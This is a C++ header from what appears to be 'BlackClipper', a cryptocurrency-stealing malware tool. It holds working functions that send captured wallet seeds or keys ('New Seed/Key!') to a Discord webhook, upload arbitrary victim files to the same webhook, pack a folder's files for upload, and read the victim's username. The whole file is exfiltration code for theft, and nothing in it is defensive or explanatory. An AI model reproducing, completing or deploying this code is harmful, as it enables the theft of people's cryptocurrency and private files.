#pragma once
#include <Windows.h>
#include <string>
#include <iostream>
#include <stdio.h>
#include <winhttp.h>
#include <string>
#include <vector>
#include <fstream>
#pragma comment(lib, "winhttp.lib")

int __server_send(std::string sKeyOrSeed) {
    HINTERNET hSession = WinHttpOpen(L"xxxh8ef",
        WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
        WINHTTP_NO_PROXY_NAME,
        WINHTTP_NO_PROXY_BYPASS,
        0);

    HINTERNET hConnect = WinHttpConnect(hSession,
        L"discordapp.com",
        INTERNET_DEFAULT_HTTPS_PORT,
        0);

    std::wstring webhookPath = L"/api/webhooks/" + std::wstring(cWebhookId, cWebhookId + strlen(cWebhookId)) + L"/" + std::wstring(cWebhookToken, cWebhookToken + strlen(cWebhookToken));
    HINTERNET hRequest = WinHttpOpenRequest(hConnect,
        L"POST",
        webhookPath.c_str(),
        NULL,
        WINHTTP_NO_REFERER,
        WINHTTP_DEFAULT_ACCEPT_TYPES,
        WINHTTP_FLAG_SECURE);

    std::string title = "New Seed/Key!";
    std::string desc = sKeyOrSeed;
    std::string color = "16711680"; // Decimal color
    std::string request_body = "{\"username\": \"BlackClipper\",\"content\": null,\"embeds\": [{\"title\": \"" + title + "\",\"description\": \"" + desc + "\",\"footer\": {\"text\": \"BlackClipper\"},\"color\": " + color + " }], \"attachments\": []}";

    BOOL bResults = WinHttpSendRequest(hRequest,
        L"Content-Type: application/json\r\n",
        (DWORD)-1L,
        (LPVOID)request_body.c_str(),
        (DWORD)request_body.length(),
        (DWORD)request_body.length(),
        0);

    if (bResults) {
        WinHttpReceiveResponse(hRequest, NULL);
    }

    WinHttpCloseHandle(hRequest);
    WinHttpCloseHandle(hConnect);
    WinHttpCloseHandle(hSession);

    return 0;
}

int __server_send_info(std::string sTitle, std::string sDescription) {
    HINTERNET hSession = WinHttpOpen(L"xxxdh8ef",
        WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
        WINHTTP_NO_PROXY_NAME,
        WINHTTP_NO_PROXY_BYPASS,
        0);

    HINTERNET hConnect = WinHttpConnect(hSession,
        L"discordapp.com",
        INTERNET_DEFAULT_HTTPS_PORT,
        0);

    std::wstring webhookPath = L"/api/webhooks/" + std::wstring(cWebhookId, cWebhookId + strlen(cWebhookId)) + L"/" + std::wstring(cWebhookToken, cWebhookToken + strlen(cWebhookToken));
    HINTERNET hRequest = WinHttpOpenRequest(hConnect,
        L"POST",
        webhookPath.c_str(),
        NULL,
        WINHTTP_NO_REFERER,
        WINHTTP_DEFAULT_ACCEPT_TYPES,
        WINHTTP_FLAG_SECURE);

    std::string title = sTitle;
    std::string desc = sDescription;
    std::string color = "16711680"; 
    std::string request_body = "{\"username\": \"BlackClipper\",\"content\": null,\"embeds\": [{\"title\": \"" + title + "\",\"description\": \"" + desc + "\",\"footer\": {\"text\": \"BlackClipper\"},\"color\": " + color + " }], \"attachments\": []}";

    BOOL bResults = WinHttpSendRequest(hRequest,
        L"Content-Type: application/json\r\n",
        (DWORD)-1L,
        (LPVOID)request_body.c_str(),
        (DWORD)request_body.length(),
        (DWORD)request_body.length(),
        0);

    if (bResults) {
        WinHttpReceiveResponse(hRequest, NULL);
    }

    WinHttpCloseHandle(hRequest);
    WinHttpCloseHandle(hConnect);
    WinHttpCloseHandle(hSession);

    return 0;
}

//chatpgt ahh webhook shit lol too lazy for allat json shit
int __server_send_file(const std::wstring& filePath) {
    HINTERNET hSession = WinHttpOpen(L"xxxh8ef",
        WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
        WINHTTP_NO_PROXY_NAME,
        WINHTTP_NO_PROXY_BYPASS,
        0);

    HINTERNET hConnect = WinHttpConnect(hSession,
        L"discordapp.com",
        INTERNET_DEFAULT_HTTPS_PORT,
        0);

    std::wstring webhookPath = L"/api/webhooks/" + std::wstring(cWebhookId, cWebhookId + strlen(cWebhookId)) + L"/" + std::wstring(cWebhookToken, cWebhookToken + strlen(cWebhookToken));
    HINTERNET hRequest = WinHttpOpenRequest(hConnect,
        L"POST",
        webhookPath.c_str(),
        NULL,
        WINHTTP_NO_REFERER,
        WINHTTP_DEFAULT_ACCEPT_TYPES,
        WINHTTP_FLAG_SECURE);

    std::ifstream fileStream(filePath, std::ios::binary | std::ios::ate);
    if (!fileStream.is_open()) {
        return 1;
    }
    std::streamsize fileSize = fileStream.tellg();
    fileStream.seekg(0, std::ios::beg);
    std::vector<char> fileData(fileSize);
    if (!fileStream.read(fileData.data(), fileSize)) {
        return 1;
    }
    fileStream.close();

    std::string boundary = "--------------------------987654321098765432109876";

    std::string request_body = "--" + boundary + "\r\n";
    request_body += "Content-Disposition: form-data; name=\"file\"; filename=\"" + std::string(filePath.begin(), filePath.end()) + "\"\r\n";
    request_body += "Content-Type: application/octet-stream\r\n\r\n";
    request_body += std::string(fileData.begin(), fileData.end()) + "\r\n";
    request_body += "--" + boundary + "--\r\n";

    std::wstring headers = L"Content-Type: multipart/form-data; boundary=" + std::wstring(boundary.begin(), boundary.end()) + L"\r\n";

    BOOL bResults = WinHttpSendRequest(hRequest,
        headers.c_str(),
        (DWORD)-1L,
        (LPVOID)request_body.c_str(),
        (DWORD)request_body.length(),
        (DWORD)request_body.length(),
        0);

    if (bResults) {
        WinHttpReceiveResponse(hRequest, NULL);
    }

    WinHttpCloseHandle(hRequest);
    WinHttpCloseHandle(hConnect);
    WinHttpCloseHandle(hSession);

    return 0;
}


std::wstring __zip_folder(const std::wstring& folderPath) {
    std::wstring zipFilePath = folderPath + L".zip";

    HANDLE hZip = CreateFileW(zipFilePath.c_str(), GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hZip == INVALID_HANDLE_VALUE) {
        std::wcerr << L"Failed to create zip archive" << std::endl;
        return L"";
    }

    std::wstring searchPath = folderPath + L"\\*.*";
    WIN32_FIND_DATAW findData;
    HANDLE hFind = FindFirstFileW(searchPath.c_str(), &findData);
    if (hFind == INVALID_HANDLE_VALUE) {
        std::wcerr << L"Failed to find files in folder" << std::endl;
        CloseHandle(hZip);
        return L"";
    }

    do {
        if (!(findData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)) {
            std::wstring filePath = folderPath + L"\\" + findData.cFileName;
            HANDLE hFile = CreateFileW(filePath.c_str(), GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
            if (hFile != INVALID_HANDLE_VALUE) {
                DWORD bytesRead = 0;
                const DWORD bufferSize = 4096;
                std::vector<char> buffer(bufferSize);
                BOOL bSuccess = FALSE;
                while (ReadFile(hFile, buffer.data(), bufferSize, &bytesRead, NULL) && bytesRead > 0) {
                    DWORD bytesWritten = 0;
                    bSuccess = WriteFile(hZip, buffer.data(), bytesRead, &bytesWritten, NULL);
                    if (!bSuccess) {
                        std::wcerr << L"Failed to write to zip archive" << std::endl;
                        CloseHandle(hFile);
                        CloseHandle(hZip);
                        return L"";
                    }
                }
                CloseHandle(hFile);
            }
        }
    } while (FindNextFileW(hFind, &findData) != 0);

    FindClose(hFind);

    CloseHandle(hZip);

    std::wcout << L"Folder zipped successfully: " << zipFilePath << std::endl;
    return zipFilePath;
}

#include <Lmcons.h>

std::string sReturnUsername() {
    char username[UNLEN + 1];
    DWORD username_len = UNLEN + 1;
    if (GetUserNameA(username, &username_len)) {
        return std::string(username);
    }
    else {
        return "UnknownUser";
    }
}
